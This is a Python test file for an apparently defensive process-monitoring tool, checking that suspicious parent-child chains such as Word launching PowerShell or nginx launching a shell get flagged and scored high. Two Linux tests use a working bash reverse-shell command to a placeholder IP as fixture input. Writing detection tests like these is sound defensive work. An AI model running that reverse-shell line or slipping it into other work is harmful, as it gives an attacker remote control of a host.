from __future__ import annotations

import json
from datetime import datetime, timezone

from quietward.collectors.parsers import parse_ps_output
from quietward.collectors.windows_parsers import parse_windows_processes
from quietward.contracts import EventKind, SecurityEvent, Severity
from quietward.scoring import DeterministicRiskScorer


class _FakePrivacyIdentity:
    def identify_scoped(self, value: str, scope: str) -> str:
        return (scope.replace("-", "") + value.replace("\\", ""))[:32].ljust(32, "0")


def _score_markers(markers: tuple[str, ...]) -> Severity:
    event = SecurityEvent(
        event_id="evt-parent-child",
        observed_at=datetime.now(timezone.utc),
        host_id="host-a",
        source="process_snapshot",
        kind=EventKind.PROCESS_START,
        subject="process",
        attributes={
            "suspicious_markers": list(markers),
            "baseline_deviation": 1.0,
        },
        confidence=0.9,
    )
    return DeterministicRiskScorer().score(event).severity


def test_office_parent_spawning_powershell_is_high_signal() -> None:
    rows = [
        {
            "ProcessId": 100,
            "ParentProcessId": 10,
            "Name": "WINWORD.EXE",
            "ExecutablePath": r"C:\Program Files\Microsoft Office\WINWORD.EXE",
            "CommandLine": r"WINWORD.EXE document.docm",
            "UserName": r"HOST\User",
        },
        {
            "ProcessId": 101,
            "ParentProcessId": 100,
            "Name": "powershell.exe",
            "ExecutablePath": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "CommandLine": "powershell.exe -NoProfile",
            "UserName": r"HOST\User",
        },
    ]
    parsed = parse_windows_processes(json.dumps(rows), _FakePrivacyIdentity())
    child = next(item for item in parsed if item.pid == 101)
    assert "document_spawned_interpreter" in child.suspicious_markers
    assert _score_markers(child.suspicious_markers) in {Severity.HIGH, Severity.CRITICAL}


def test_office_parent_normal_child_does_not_trigger_interpreter_marker() -> None:
    rows = [
        {
            "ProcessId": 100,
            "ParentProcessId": 10,
            "Name": "WINWORD.EXE",
            "ExecutablePath": r"C:\Program Files\Microsoft Office\WINWORD.EXE",
            "CommandLine": r"WINWORD.EXE document.docx",
            "UserName": r"HOST\User",
        },
        {
            "ProcessId": 101,
            "ParentProcessId": 100,
            "Name": "splwow64.exe",
            "ExecutablePath": r"C:\Windows\System32\splwow64.exe",
            "CommandLine": "splwow64.exe",
            "UserName": r"HOST\User",
        },
    ]
    parsed = parse_windows_processes(json.dumps(rows), _FakePrivacyIdentity())
    child = next(item for item in parsed if item.pid == 101)
    assert "document_spawned_interpreter" not in child.suspicious_markers


def test_interpreter_without_document_parent_does_not_get_parent_child_marker() -> None:
    rows = [
        {
            "ProcessId": 100,
            "ParentProcessId": 10,
            "Name": "explorer.exe",
            "ExecutablePath": r"C:\Windows\explorer.exe",
            "CommandLine": "explorer.exe",
            "UserName": r"HOST\User",
        },
        {
            "ProcessId": 101,
            "ParentProcessId": 100,
            "Name": "powershell.exe",
            "ExecutablePath": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "CommandLine": "powershell.exe -NoProfile",
            "UserName": r"HOST\User",
        },
    ]
    parsed = parse_windows_processes(json.dumps(rows), _FakePrivacyIdentity())
    child = next(item for item in parsed if item.pid == 101)
    assert "document_spawned_interpreter" not in child.suspicious_markers


def test_linux_web_server_spawning_reverse_shell_is_high_signal() -> None:
    parsed = parse_ps_output(
        "200 1 www-data nginx nginx: worker process\n"
        "201 200 www-data bash bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'\n"
    )
    child = next(item for item in parsed if item.pid == 201)
    assert "reverse_shell" in child.suspicious_markers
    assert "web_server_spawned_suspicious_shell" in child.suspicious_markers
    assert _score_markers(child.suspicious_markers) in {Severity.HIGH, Severity.CRITICAL}


def test_linux_web_server_normal_shell_does_not_get_parent_child_marker() -> None:
    parsed = parse_ps_output(
        "200 1 www-data nginx nginx: worker process\n"
        "201 200 www-data bash bash -c 'echo healthcheck'\n"
    )
    child = next(item for item in parsed if item.pid == 201)
    assert "web_server_spawned_suspicious_shell" not in child.suspicious_markers


def test_linux_reverse_shell_without_web_parent_does_not_get_ancestry_marker() -> None:
    parsed = parse_ps_output(
        "200 1 user systemd systemd --user\n"
        "201 200 user bash bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'\n"
    )
    child = next(item for item in parsed if item.pid == 201)
    assert "reverse_shell" in child.suspicious_markers
    assert "web_server_spawned_suspicious_shell" not in child.suspicious_markers
